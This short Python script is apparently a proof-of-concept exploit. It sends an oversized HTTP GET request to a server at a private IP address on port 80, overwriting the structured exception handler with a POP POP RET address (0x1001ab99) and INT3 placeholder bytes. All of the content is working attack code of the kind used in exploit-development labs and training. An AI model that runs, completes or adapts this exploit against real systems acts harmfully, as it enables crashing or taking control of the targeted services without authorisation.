import socket
import os
import sys

ip = "192.168.99.100"
port = 80

nseh = "\xcc" * 4

#POP POP RET 0x1001ab99
seh = '\x99\xab\x01\x10'

crash = "A" * 4061
crash += nseh
crash += seh
crash += "D" * (5000 - len(crash))


buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
